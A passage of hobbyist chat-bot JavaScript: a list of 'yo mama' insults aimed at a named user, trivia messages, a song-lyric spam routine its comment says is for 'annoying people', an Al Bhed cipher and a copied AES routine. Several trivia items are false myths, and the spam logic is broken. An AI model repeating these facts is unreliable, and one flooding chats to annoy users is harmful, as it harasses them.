                        else if( randomNumber == 82) sendPC(argu+",Yo mama`s so stupid, she got fired from the M&M`s factory for throwing away all the W`s.",argu2);
                        else if( randomNumber == 83) sendPC(argu+",Yo mama`s so stupid, she heard that 90% of all accidents occur around the home, so she moved.",argu2);
                        else if( randomNumber == 84) sendPC(argu+",Yo mama`s so ugly, when she joined an ugly contest, they said, ``Sorry, no professionals.``",argu2);
                        else if( randomNumber == 85) sendPC(argu+",Yo mama`s so ugly, her face is closed on weekends.",argu2);
                        else if( randomNumber == 86) sendPC(argu+",Yo mama`s so ugly, when she gets up, the sun goes down.",argu2);
                        else if( randomNumber == 87) sendPC(argu+",Yo mama`s so ugly, she has to sneak up on bath water.",argu2);
                        else if( randomNumber == 88) sendPC(argu+",Yo mama`s so ugly, her picture is on the inside of a Roach Motel.",argu2);
                        else if( randomNumber == 89) sendPC(argu+",Yo mama`s so ugly, she`d make a train take a dirt road.",argu2);
                        else if( randomNumber == 90) sendPC(argu+",Yo mama`s so ugly, instead of having her own 900 number, she has her own 911 number.",argu2);
                        else if( randomNumber == 91) sendPC(argu+",Yo mama`s so ugly, when I took her to a haunted house, she came out with a paycheck.",argu2);
                        else if( randomNumber == 92) sendPC(argu+",Yo mama`s so ugly, when I took her to the zoo, the guy at the door said, ``Thanks for bringing her back.``",argu2);
                        else if( randomNumber == 93) sendPC(argu+",Yo mama`s so ugly, people go as her for Halloween.",argu2);
                        else if( randomNumber == 94) sendPC(argu+",Yo mama`s so ugly, she has to trick or treat over the phone.",argu2);
                        else if( randomNumber == 95) sendPC(argu+",Yo mama`s so ugly, the government moved Halloween to her birthday.",argu2);
                        else if( randomNumber == 96) sendPC(argu+",Yo mama`s so ugly, she makes onions cry.",argu2);
                        else if( randomNumber == 97) sendPC(argu+",Yo mama`s so ugly, she scares away blind kids.",argu2);
                        else if( randomNumber == 98) sendPC(argu+",Yo mama`s so ugly, she threw a boomerang and it wouldn`t come back.",argu2);
                        else if( randomNumber == 99) sendPC(argu+",Yo mama`s so ugly, when she was born, the doctor slapped her mama.",argu2);
                        else if( randomNumber == 100) sendPC(argu+",Yo mama`s so ugly, the doctor`s still slapping her.",argu2);
                        else if( randomNumber == 101) sendPC(argu+",Yo mama`s so ugly, when she leaned over to hear, ``snap, crackle, pop,`` all she heard was ``Aargh! Get us out of here!``",argu2);
                        else if( randomNumber == 102) sendPC(argu+",Yo mama`s so ugly, the psychiatrist makes her lie face down.",argu2);
                        else if( randomNumber == 103) sendPC(argu+",Yo mama`s so ugly, they didn`t give her a costume when she tried out for Star Wars.",argu2);
                        else if( randomNumber == 104) sendPC(argu+",Yo mama`s so ugly, when she passes by a bathroom all the toilets flush.",argu2);
                        else if( randomNumber == 105) sendPC(argu+",Yo mama`s so ugly, when she walks in the kitchen, the rats jump on the table and start screaming.",argu2);
                        else if( randomNumber == 106) sendPC(argu+",Yo mama`s so ugly, when she walks into a bank, they turn off the cameras.",argu2);
                        else if( randomNumber == 107) sendPC(argu+",Yo mama`s so ugly, her parents fed her with a slingshot.",argu2);
                        else if( randomNumber == 108) sendPC(argu+",Yo mama`s so old, her birth certificate expired.",argu2);
                        else if( randomNumber == 109) sendPC(argu+",Yo mama`s so old, I told her to act her age and she died.",argu2);
                        else if( randomNumber == 110) sendPC(argu+",Yo mama`s so old, her social security number is 23.",argu2);
                        else if( randomNumber == 111) sendPC(argu+",Yo mama`s so old, when she was in school there was no history class.",argu2);
                        else if( randomNumber == 112) sendPC(argu+",Yo mama`s so old, Moses is in her high school yearbook.",argu2);
                        else if( randomNumber == 113) sendPC(argu+",Yo mama`s so old, she knew Burger King while he was still a prince.",argu2);
                        else if( randomNumber == 114) sendPC(argu+",Yo mama`s so poor, when I ring the doorbell she says ``Ding!``",argu2);
                        else if( randomNumber == 115) sendPC(argu+",Yo mama`s so poor, when I saw her kicking a can down the street and asked her what she was doing, she said, ``Moving.``",argu2);
                        else if( randomNumber == 116) sendPC(argu+",Yo mama`s so poor, she has to eat a large pizza outside.",argu2);
                        else if( randomNumber == 117) sendPC(argu+",Yo mama`s so poor, she has to go outside to change her mind.",argu2);
                        else if( randomNumber == 118) sendPC(argu+",Yo mama`s so poor, she dropped a kleenex and got wall-to-wall carpeting.",argu2);
                        else if( randomNumber == 119) sendPC(argu+",Yo mama`s so poor, she went to McDonald`s and put a milkshake on layaway.",argu2);
                        else if( randomNumber == 120) sendPC(argu+",Yo mama`s so poor, your TV has 2 channels: ``on`` and ``off.``",argu2);
                        else if( randomNumber == 121) sendPC(argu+",Yo mama`s so poor, they put her picture on the food stamp.",argu2);
                        else if( randomNumber == 122) sendPC(argu+",Yo mama`s so poor, she can`t even afford to pay attention.",argu2);
                        else if( randomNumber == 123) sendPC(argu+",Yo mama`s so short, she poses for trophies.",argu2);
                        else if( randomNumber == 124) sendPC(argu+",Yo mama`s so short, she can do backflips under the bed.",argu2);
                        else if( randomNumber == 125) sendPC(argu+",Yo mama`s so short, she needs a ladder to pick up a dime.",argu2);
                        else if( randomNumber == 126) sendPC(argu+",Yo mama`s so short, you can see her feet on her driver`s license picture.",argu2);
                        else if( randomNumber == 127) sendPC(argu+",Yo mama`s so skinny, she turned sideways and disappeared.",argu2);
                        else if( randomNumber == 128) sendPC(argu+",Yo mama`s so skinny, she got her ear pierced and died.",argu2);
                        else if( randomNumber == 129) sendPC(argu+",Yo mama`s so skinny, she has to wear a belt with spandex.",argu2);
                        else if( randomNumber == 130) sendPC(argu+",Yo mama smells so bad, she made Speed Stick slow down.",argu2);
                        else if( randomNumber == 131) sendPC(argu+",Yo mama smells so bad, she made Right Guard turn left.",argu2);
                        else if( randomNumber == 132) sendPC(argu+",Yo mama smells so bad, Secret told on her.",argu2);
                        else if( randomNumber == 133) sendPC(argu+",Yo mama smells so bad, Sure is confused.",argu2);
                        else if( randomNumber == 134) sendPC(argu+",Yo mama`s so bald, her hair looks like stitches.",argu2);
                        else if( randomNumber == 135) sendPC(argu+",Yo mama`s so bald, she uses rice for curlers.",argu2);
                        else if( randomNumber == 136) sendPC(argu+",Yo mama`s so bald, when she showers she gets brainwashed.",argu2);
                        else if( randomNumber == 137) sendPC(argu+",Yo mama`s so bald, I can see what`s on her mind.",argu2);
                        else if( randomNumber == 138) sendPC(argu+",Yo mama`s so bald, a wig doesn`t help.",argu2);
                        else if( randomNumber == 139) sendPC(argu+",Yo mama`s got a wooden leg with a kickstand.",argu2);
                        else if( randomNumber == 140) sendPC(argu+",Yo mama`s got a wooden leg with branches.",argu2);
                        else if( randomNumber == 141) sendPC(argu+",Yo mama`s got a wooden leg with a real foot.",argu2);
                        else if( randomNumber == 142) sendPC(argu+",Yo mama`s got two wooden legsYo mama`s got  and one is backward.",argu2);
                        else if( randomNumber == 143) sendPC(argu+",Yo mama`s got a glass leg full of Kool-aid.",argu2);
                        else if( randomNumber == 144) sendPC(argu+",Yo mama`s got an afro with a chin strap.",argu2);
                        else if( randomNumber == 145) sendPC(argu+",Yo mama`s got a $4 weave and don`t know when to leave.",argu2);
                        else if( randomNumber == 146) sendPC(argu+",Yo mama`s got a bald head with a part and sideburns.",argu2);
                        else if( randomNumber == 147) sendPC(argu+",Yo mama`s got a metal afro with rusty sideburns.",argu2);
                        else if( randomNumber == 148) sendPC(argu+",Yo mama`s got a wooden afro with an ``x`` carved in the back.",argu2);
                        else if( randomNumber == 149) sendPC(argu+",Yo mama`s got green hair and thinks she`s a tree.",argu2);
                        else if( randomNumber == 150) sendPC(argu+",Yo mama`s got a wooden head.",argu2);
                        else if( randomNumber == 151) sendPC(argu+",Yo mama`s got a leather wig with suede sideburns.",argu2);
                        else if( randomNumber == 152) sendPC(argu+",Yo mama`s got more weave than a dog in traffic.",argu2);
                        else if( randomNumber == 153) sendPC(argu+",Yo mama`s got snakeskin teeth.",argu2);
                        else if( randomNumber == 154) sendPC(argu+",Yo mama`s got so many gaps in her teeth it looks like piano keys.",argu2);
                        else if( randomNumber == 155) sendPC(argu+",Yo mama`s got teeth so rotten they look like dice.",argu2);
                        else if( randomNumber == 156) sendPC(argu+",Yo mama`s got teeth so yellow when she smiles she slows down traffic.",argu2);
                        else if( randomNumber == 157) sendPC(argu+",Yo mama`s got breath so bad when she yawns her teeth duck.",argu2);
                        else if( randomNumber == 158) sendPC(argu+",Yo mama`s got breath so bad people on the phone hang up.",argu2);
                        else if( randomNumber == 159) sendPC(argu+",Yo mama`s got a glass eye with a goldfish in it.",argu2);
                        else if( randomNumber == 160) sendPC(argu+",Yo mama`s got so many rolls of fat she has to screw on her pants.",argu2);
                        else if( randomNumber == 161) sendPC(argu+",Yo mama`s got three teeth, one in her mouth and two in her pocket.",argu2);
                        else if( randomNumber == 162) sendPC(argu+",Yo mama`s got 11 fingers, all on the same hand.",argu2);
                        else if( randomNumber == 163) sendPC(argu+",Yo mama`s got 4 eyes and 2 pairs of sunglasses.",argu2);
                        else if( randomNumber == 164) sendPC(argu+",Yo mama`s got no ears and is trying on sunglasses.",argu2);
                        else if( randomNumber == 165) sendPC(argu+",Yo mama`s got a forehead so big you can show slides on it.",argu2);
                        else if( randomNumber == 166) sendPC(argu+",Yo mama`s got feet so big, her sneakers need license plates.",argu2);
                        else if( randomNumber == 167) sendPC(argu+",Yo mama`s got a mouth so big, she talks in surround sound.",argu2);
                        else if( randomNumber == 168) sendPC(argu+",Yo mama`s got a head so big, it shows up on radar.",argu2);
                        else if( randomNumber == 169) sendPC(argu+",Yo mama`s got a head so big, she don`t have dreams, she has movies.",argu2);
                        else if( randomNumber == 170) sendPC(argu+",Yo mama`s got a head so big, she has to step into her shirt.",argu2);
                        else if( randomNumber == 171) sendPC(argu+",Yo mama`s got such an ugly car, someone broke in just to steal The Club.",argu2);
                        else if( randomNumber == 172) sendPC(argu+",Yo mama`s got one toe and one knee and her name is ``Tony.``",argu2);
                        else if( randomNumber == 173) sendPC(argu+",Yo mama`s got one leg and her name is ``Eileen.``",argu2);
                }
                function funfacts() {
                var randomNumber = Math.floor( Math.random() * 20 ) + 1;
                if( randomNumber == 1 ) sendMessage(botresponename+":  If you yelled for 8 years, 7 months and 6 days, you would have produced enough sound energy to heat one cup of coffee.");
                else if( randomNumber == 2 ) sendMessage(botresponename+":  The strongest muscle in proportion to its size in the human body is the tongue.");
                else if( randomNumber == 3 ) sendMessage(botresponename+":  Every time you lick a stamp, you're consuming 1/10 of a calorie.");
                else if( randomNumber == 4 ) sendMessage(botresponename+":  The human heart creates enough pressure when it pumps out to the body to squirt blood 30 feet.");
                else if( randomNumber == 5 ) sendMessage(botresponename+":  Banging your head against a wall uses 150 calories an hour.");
                else if( randomNumber == 6 ) sendMessage(botresponename+":  The average person falls asleep in seven minutes.");
                else if( randomNumber == 7 ) sendMessage(botresponename+":  Your stomach has to produce a new layer of mucus every two weeks otherwise it will digest itself");
                else if( randomNumber == 8 ) sendMessage(botresponename+":  Humans are the only primates that don't have pigment in the palms of their hands.");
                else if( randomNumber == 9 ) sendMessage(botresponename+":  Thirty-five percent of the people who use personal ads for dating are already married.");
                else if( randomNumber == 10 ) sendMessage(botresponename+":  It's possible to lead a cow upstairs...but not downstairs");
                else if( randomNumber == 11 ) sendMessage(botresponename+":  Dogs have four toes on their hind feet, and five on their front feet.");
                else if( randomNumber == 12 ) sendMessage(botresponename+":  Butterflies taste with their feet.");
                else if( randomNumber == 13 ) sendMessage(botresponename+":  A pregnant goldfish is called a twit.");
                else if( randomNumber == 14 ) sendMessage(botresponename+":  A cockroach will live nine days without it's head, before it starves to death.");
                else if( randomNumber == 15 ) sendMessage(botresponename+":  Elephants are the only mamals that can't jump.");
                else if( randomNumber == 16 ) sendMessage(botresponename+":  A duck's quack doesn't echo, and no one knows why.");
                else if( randomNumber == 17 ) sendMessage(botresponename+":  Snails can sleep for 3 years without eating");
                else if( randomNumber == 18 ) sendMessage(botresponename+":  Porcupines float in water.");
                else if( randomNumber == 19 ) sendMessage(botresponename+":  A giraffe can clean its ears with its 21-inch tongue!");
                else if( randomNumber == 20 ) sendMessage(botresponename+":  A Saudi Arabian woman can get a divorce if her husband doesn't give her coffee.");
                }
                function spamCoord() //I should of used var insult= [...] but I'm too lazy, by Twin, for some annoying people.
                    {
                        var pope = -6;
                        var randomNumber = setInterval( function() { pope + 1 },1500);
                        if( randomNumber == 1) sendMessage("You know you love me, I know you care");
                        else if( randomNumber == 2) sendMessage("Just shout whenever, and Ill be there");
                        else if( randomNumber == 3) sendMessage("You are my love, you are my heart");
                        else if( randomNumber == 4) sendMessage("And we will never, ever, ever be apart");
                        else if( randomNumber == 5) sendMessage("Are we an item? Girl, quit playin");
                        else if( randomNumber == 6) sendMessage("Were just friends, what are you sayin?");
                        else if( randomNumber == 7) sendMessage("Said theres another, and looked right in my eyes");
                        else if( randomNumber == 8) sendMessage("My first love broke my heart for the first time");
                        else if( randomNumber == 9) sendMessage("And I was like baby, baby, baby, oh");
                        else if( randomNumber == 10) sendMessage("Like baby, baby, baby, no");
                        else if( randomNumber == 11) sendMessage("Like baby, baby, baby, oh");
                        else if( randomNumber == 12) sendMessage("I thought youd always be mine, mine");
                        else if( randomNumber == 13) sendMessage("Baby, baby, baby, oh");
                        else if( randomNumber == 14) sendMessage("Like baby, baby, baby, no");
                        else if( randomNumber == 15) sendMessage("Like baby, baby, baby, oh");
                        else if( randomNumber == 16) sendMessage("I thought youd always be mine, mine");
                        else if( randomNumber == 17) sendMessage("For you, I would have done whatever");
                        else if( randomNumber == 18) sendMessage("And I just cant believe were here together");
                        else if( randomNumber == 19) sendMessage("And I wanna play it cool, but Im losin you");
                        else if( randomNumber == 20) sendMessage("Ill buy you anything, Ill buy you any ring");
                        else if( randomNumber == 21) sendMessage("And Im in pieces, baby fix me");
                        else if( randomNumber == 22) sendMessage("And just shake me til you wake me from this bad dream");
                        else if( randomNumber == 23) sendMessage("Im goin down, down, down, down");
                        else if( randomNumber == 24) sendMessage("And I just cant believe my first love wont be around");
                        else if( randomNumber == 25) sendMessage("And Im like baby, baby, baby, oh");
                        else if( randomNumber == 26) sendMessage("Like baby, baby, baby, no");
                        else if( randomNumber == 27) sendMessage("Like baby, baby, baby, oh");
                        else if( randomNumber == 28) sendMessage("I thought youd always be mine, mine");
                        else if( randomNumber == 29) sendMessage("Baby, baby, baby, oh");
                        else if( randomNumber == 30) sendMessage("Like baby, baby, baby, no");
                        else if( randomNumber == 31) sendMessage("Like baby, baby, baby, oh");
                        else if( randomNumber == 32) sendMessage("I thought youd always be mine, mine");
                        else if( randomNumber == 33) sendMessage("When I was 13, I had my first love");
                        else if( randomNumber == 34) sendMessage("There was nobody that compared to my baby");
                        else if( randomNumber == 35) sendMessage("And nobody came between us who could ever come above");
                        else if( randomNumber == 36) sendMessage("She had me going crazy, oh I was starstruck");
                        else if( randomNumber == 37) sendMessage("She woke me up daily, dont need no Starbucks");
                        else if( randomNumber == 38) sendMessage("She made my heart pound");
                        else if( randomNumber == 39) sendMessage("I skip a beat when I see her in the street");
                        else if( randomNumber == 40) sendMessage("And at school on the playground");
                        else if( randomNumber == 41) sendMessage("But I really wanna see her on a weekend");
                        else if( randomNumber == 42) sendMessage("She know she got me dazin cause she was so amazin");
                        else if( randomNumber == 43) sendMessage("And now my heart is breakin but I just keep on sayin");
                        else if( randomNumber == 44) sendMessage("Baby, baby, baby, oh");
                        else if( randomNumber == 45) sendMessage("Like baby, baby, baby, no");
                        else if( randomNumber == 46) sendMessage("Like baby, baby, baby, oh");
                        else if( randomNumber == 47) sendMessage("I thought youd always be mine, mine");
                        else if( randomNumber == 48) sendMessage("Baby, baby, baby, oh");
                        else if( randomNumber == 49) sendMessage("Like baby, baby, baby, no");
                        else if( randomNumber == 50) sendMessage("Like baby, baby, baby, oh");
                        else if( randomNumber == 51) sendMessage("I thought youd always be mine, mine");
                }
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
  var validator = "abcdefghjiklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
  var vowels = "aeiouyAEIOUY";

 eamap = new Array();
  eamap["a"] = "o";  eamap["b"] = "x";  eamap["c"] = "p";  eamap["d"] = "k";
  eamap["e"] = "y";  eamap["f"] = "b";  eamap["g"] = "r";  eamap["h"] = "w";
  eamap["i"] = "e";  eamap["j"] = "m";  eamap["k"] = "n";  eamap["l"] = "d";
  eamap["m"] = "t";  eamap["n"] = "f";  eamap["o"] = "a";  eamap["p"] = "h";
  eamap["q"] = "v";  eamap["r"] = "l";  eamap["s"] = "z";  eamap["t"] = "s";
  eamap["u"] = "i";  eamap["v"] = "j";  eamap["w"] = "q";  eamap["x"] = "g";
  eamap["y"] = "u";  eamap["z"] = "c";  
  eamap["A"] = "O";  eamap["B"] = "X";  eamap["C"] = "P";  eamap["D"] = "K";
  eamap["E"] = "Y";  eamap["F"] = "B";  eamap["G"] = "R";  eamap["H"] = "W";
  eamap["I"] = "E";  eamap["J"] = "M";  eamap["K"] = "N";  eamap["L"] = "D";
  eamap["M"] = "T";  eamap["N"] = "F";  eamap["O"] = "A";  eamap["P"] = "H";
  eamap["Q"] = "V";  eamap["R"] = "L";  eamap["S"] = "Z";  eamap["T"] = "S";
  eamap["U"] = "I";  eamap["V"] = "F";  eamap["W"] = "Q";  eamap["X"] = "G";
  eamap["Y"] = "U";  eamap["Z"] = "C";

  aemap = new Array();
  aemap["o"] = "a";  aemap["x"] = "b";  aemap["p"] = "c";  aemap["k"] = "d";
  aemap["y"] = "e";  aemap["b"] = "f";  aemap["r"] = "g";  aemap["w"] = "h";
  aemap["e"] = "i";  aemap["m"] = "j";  aemap["n"] = "k";  aemap["d"] = "l";
  aemap["t"] = "m";  aemap["f"] = "n";  aemap["a"] = "o";  aemap["h"] = "p";
  aemap["v"] = "q";  aemap["l"] = "r";  aemap["z"] = "s";  aemap["s"] = "t";
  aemap["i"] = "u";  aemap["j"] = "v";  aemap["q"] = "w";  aemap["g"] = "x";
  aemap["u"] = "y";  aemap["c"] = "z";
  aemap["O"] = "A";  aemap["X"] = "B";  aemap["P"] = "C";  aemap["K"] = "D";
  aemap["Y"] = "E";  aemap["B"] = "F";  aemap["R"] = "G";  aemap["W"] = "H";
  aemap["E"] = "I";  aemap["M"] = "J";  aemap["N"] = "K";  aemap["D"] = "L";
  aemap["T"] = "M";  aemap["F"] = "N";  aemap["A"] = "O";  aemap["H"] = "P";
  aemap["V"] = "Q";  aemap["L"] = "R";  aemap["Z"] = "S";  aemap["S"] = "T";
  aemap["I"] = "U";  aemap["F"] = "V";  aemap["Q"] = "W";  aemap["G"] = "X"; 
  aemap["U"] = "Y";  aemap["C"] = "Z";

function transme() {
  if (rheFugiSwitch == 1) { // english to al bhed 
    builder = ""; toggler=0;

    for (var i=0; i < RHETEXT.length; i++) {
      if (RHETEXT.charAt(i)=="[") {toggler=1;};
      if (RHETEXT.charAt(i)=="]") {toggler=0;};

      if (toggler==1) {builder=builder+RHETEXT.charAt(i);}
      else {
        if (validator.indexOf(RHETEXT.charAt(i))==-1)
          {builder=builder+RHETEXT.charAt(i);}
        else
          {builder=builder+eamap[RHETEXT.charAt(i)];};
      };
    };

    builder2 = ""; toggler=0; prev=0;

    for (var i=0; i < RHETEXT.length; i++) {
      if (RHETEXT.charAt(i)=="[") {toggler=1;};
      if (RHETEXT.charAt(i)=="]") {toggler=0;};

      if (toggler==1) {builder2=builder2+RHETEXT.charAt(i);}
      else {
        if (validator.indexOf(RHETEXT.charAt(i))==-1)
          {builder2=builder2+RHETEXT.charAt(i);
           prev=0;}
      };      
    };
    RHETEXT=builder;

  } else { //al bhed to english
    builder = ""; toggler=0;

    for (var i=0; i < RHETEXT.length; i++) {
      if (RHETEXT.charAt(i)=="[") {toggler=1;};
      if (RHETEXT.charAt(i)=="]") {toggler=0;};

      if (toggler==1) {builder=builder+RHETEXT.charAt(i);}
      else {
        if (validator.indexOf(RHETEXT.charAt(i))==-1)
          {builder=builder+RHETEXT.charAt(i);}
        else
          {builder=builder+aemap[RHETEXT.charAt(i)];};
      };
    };
    RHETEXT=builder;
  };
  return false;  
};

/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  */
/*  AES implementation in JavaScript (c) Chris Veness 2005-2012                                   */
/*   - see http://csrc.nist.gov/publications/PubsFIPS.html#197                                    */
/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  */

var Aes = {};  // Aes namespace

/**
 * AES Cipher function: encrypt 'input' state with Rijndael algorithm
 *   applies Nr rounds (10/12/14) using key schedule w for 'add round key' stage
 *
 * @param {Number[]} input 16-byte (128-bit) input state array
 * @param {Number[][]} w   Key schedule as 2D byte-array (Nr+1 x Nb bytes)
 * @returns {Number[]}     Encrypted output state array
 */
Aes.cipher = function(input, w) {    // main Cipher function [§5.1]
  var Nb = 4;               // block size (in words): no of columns in state (fixed at 4 for AES)
  var Nr = w.length/Nb - 1; // no of rounds: 10/12/14 for 128/192/256-bit keys

  var state = [[],[],[],[]];  // initialise 4xNb byte-array 'state' with input [§3.4]
  for (var i=0; i<4*Nb; i++) state[i%4][Math.floor(i/4)] = input[i];

  state = Aes.addRoundKey(state, w, 0, Nb);

  for (var round=1; round<Nr; round++) {
    state = Aes.subBytes(state, Nb);
    state = Aes.shiftRows(state, Nb);
    state = Aes.mixColumns(state, Nb);
    state = Aes.addRoundKey(state, w, round, Nb);
  }

  state = Aes.subBytes(state, Nb);
  state = Aes.shiftRows(state, Nb);
  state = Aes.addRoundKey(state, w, Nr, Nb);

  var output = new Array(4*Nb);  // convert state to 1-d array before returning [§3.4]
  for (var i=0; i<4*Nb; i++) output[i] = state[i%4][Math.floor(i/4)];
  return output;
}

/**
 * Perform Key Expansion to generate a Key Schedule
 *
 * @param {Number[]} key Key as 16/24/32-byte array
 * @returns {Number[][]} Expanded key schedule as 2D byte-array (Nr+1 x Nb bytes)
 */
Aes.keyExpansion = function(key) {  // generate Key Schedule (byte-array Nr+1 x Nb) from Key [§5.2]
  var Nb = 4;            // block size (in words): no of columns in state (fixed at 4 for AES)
  var Nk = key.length/4  // key length (in words): 4/6/8 for 128/192/256-bit keys
  var Nr = Nk + 6;       // no of rounds: 10/12/14 for 128/192/256-bit keys

  var w = new Array(Nb*(Nr+1));
  var temp = new Array(4);

  for (var i=0; i<Nk; i++) {
    var r = [key[4*i], key[4*i+1], key[4*i+2], key[4*i+3]];
    w[i] = r;
  }

  for (var i=Nk; i<(Nb*(Nr+1)); i++) {
    w[i] = new Array(4);
    for (var t=0; t<4; t++) temp[t] = w[i-1][t];
    if (i % Nk == 0) {
      temp = Aes.subWord(Aes.rotWord(temp));
      for (var t=0; t<4; t++) temp[t] ^= Aes.rCon[i/Nk][t];
    } else if (Nk > 6 && i%Nk == 4) {
      temp = Aes.subWord(temp);
    }
    for (var t=0; t<4; t++) w[i][t] = w[i-Nk][t] ^ temp[t];
  }

  return w;
}

/*
 * ---- remaining routines are private, not called externally ----
 */
 
Aes.subBytes = function(s, Nb) {    // apply SBox to state S [§5.1.1]
  for (var r=0; r<4; r++) {
    for (var c=0; c<Nb; c++) s[r][c] = Aes.sBox[s[r][c]];
  }
  return s;
}

Aes.shiftRows = function(s, Nb) {    // shift row r of state S left by r bytes [§5.1.2]
  var t = new Array(4);
  for (var r=1; r<4; r++) {
    for (var c=0; c<4; c++) t[c] = s[r][(c+r)%Nb];  // shift into temp copy
    for (var c=0; c<4; c++) s[r][c] = t[c];         // and copy back
  }          // note that this will work for Nb=4,5,6, but not 7,8 (always 4 for AES):
  return s;  // see asmaes.sourceforge.net/rijndael/rijndaelImplementation.pdf
}

Aes.mixColumns = function(s, Nb) {   // combine bytes of each col of state S [§5.1.3]
  for (var c=0; c<4; c++) {
    var a = new Array(4);  // 'a' is a copy of the current column from 's'
    var b = new Array(4);  // 'b' is a•{02} in GF(2^8)
    for (var i=0; i<4; i++) {
      a[i] = s[i][c];
      b[i] = s[i][c]&0x80 ? s[i][c]<<1 ^ 0x011b : s[i][c]<<1;

    }
    // a[n] ^ b[n] is a•{03} in GF(2^8)
    s[0][c] = b[0] ^ a[1] ^ b[1] ^ a[2] ^ a[3]; // 2*a0 + 3*a1 + a2 + a3
    s[1][c] = a[0] ^ b[1] ^ a[2] ^ b[2] ^ a[3]; // a0 * 2*a1 + 3*a2 + a3
    s[2][c] = a[0] ^ a[1] ^ b[2] ^ a[3] ^ b[3]; // a0 + a1 + 2*a2 + 3*a3
    s[3][c] = a[0] ^ b[0] ^ a[1] ^ a[2] ^ b[3]; // 3*a0 + a1 + a2 + 2*a3
  }
  return s;
}

Aes.addRoundKey = function(state, w, rnd, Nb) {  // xor Round Key into state S [§5.1.4]
  for (var r=0; r<4; r++) {
    for (var c=0; c<Nb; c++) state[r][c] ^= w[rnd*4+c][r];
  }
  return state;
}

Aes.subWord = function(w) {    // apply SBox to 4-byte word w
  for (var i=0; i<4; i++) w[i] = Aes.sBox[w[i]];
  return w;
}

Aes.rotWord = function(w) {    // rotate 4-byte word w left by one byte
  var tmp = w[0];
  for (var i=0; i<3; i++) w[i] = w[i+1];
  w[3] = tmp;
  return w;
}

// sBox is pre-computed multiplicative inverse in GF(2^8) used in subBytes and keyExpansion [§5.1.1]
Aes.sBox =  [0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
             0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
             0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
             0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
             0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
             0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
             0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
             0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
             0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
             0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
             0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
             0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
             0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
             0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
             0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
             0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16];

// rCon is Round Constant used for the Key Expansion [1st col is 2^(r-1) in GF(2^8)] [§5.2]
Aes.rCon = [ [0x00, 0x00, 0x00, 0x00],
             [0x01, 0x00, 0x00, 0x00],
             [0x02, 0x00, 0x00, 0x00],
             [0x04, 0x00, 0x00, 0x00],
             [0x08, 0x00, 0x00, 0x00],
             [0x10, 0x00, 0x00, 0x00],
             [0x20, 0x00, 0x00, 0x00],
             [0x40, 0x00, 0x00, 0x00],
             [0x80, 0x00, 0x00, 0x00],
             [0x1b, 0x00, 0x00, 0x00],
             [0x36, 0x00, 0x00, 0x00] ]; 


/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  */
/*  AES Counter-mode implementation in JavaScript (c) Chris Veness 2005-2012                      */
/*   - see http://csrc.nist.gov/publications/nistpubs/800-38a/sp800-38a.pdf                       */
/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  */

Aes.Ctr = {};  // Aes.Ctr namespace: a subclass or extension of Aes

/** 
 * Encrypt a text using AES encryption in Counter mode of operation
 *
 * Unicode multi-byte character safe
 *
 * @param {String} plaintext Source text to be encrypted
 * @param {String} password  The password to use to generate a key
 * @param {Number} nBits     Number of bits to be used in the key (128, 192, or 256)
 * @returns {string}         Encrypted text
 */
Aes.Ctr.encrypt = function(plaintext, password, nBits) {
  var blockSize = 16;  // block size fixed at 16 bytes / 128 bits (Nb=4) for AES
  if (!(nBits==128 || nBits==192 || nBits==256)) return '';  // standard allows 128/192/256 bit keys
  plaintext = Utf8.encode(plaintext);
  password = Utf8.encode(password);
  //var t = new Date();  // timer
	
  // use AES itself to encrypt password to get cipher key (using plain password as source for key 
  // expansion) - gives us well encrypted key (though hashed key might be preferred for prod'n use)
  var nBytes = nBits/8;  // no bytes in key (16/24/32)
  var pwBytes = new Array(nBytes);
  for (var i=0; i<nBytes; i++) {  // use 1st 16/24/32 chars of password for key
    pwBytes[i] = isNaN(password.charCodeAt(i)) ? 0 : password.charCodeAt(i);
  }
